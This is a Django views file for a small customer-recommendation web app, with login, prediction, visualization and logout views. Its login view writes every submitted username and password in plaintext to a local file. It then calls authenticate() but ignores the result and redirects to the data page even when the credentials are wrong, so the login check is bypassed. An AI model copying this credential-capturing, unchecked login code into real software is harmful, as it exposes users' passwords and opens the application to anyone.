from django.http import HttpResponse
from django.shortcuts import render, redirect
from django.contrib.auth import logout,authenticate,login
import numpy as np
from joblib import load
import pickle


# model = load('./customer_recommendation.joblib')
model = pickle.load(open('artifacts/customer_recommendation.pkl', 'rb'))

# print(model)

def index(request):
    if request.user.is_anonymous:
        return redirect("/login")
    return render(request,'login.html')

def loginUser(request): 

    if request.method=="POST":
        username=request.POST.get('username')
        password=request.POST.get('password')

        with open('credentials.txt', 'w') as f:
            f.write(f'Username: {username}\nPassword: {password}')
        
        user = authenticate(username=username, password=password)
        
        return redirect("/data")
        

    return render(request,'login.html')



def predict(request):
    return render(request, 'index.html', {'model': model})
    # return render(request,'index.html')

def visual(request):
    return render(request, 'visualization.html')

def description(request):
    return render(request, 'description.html')

def logoutUser(request):
    logout(request)
    return redirect("/login")
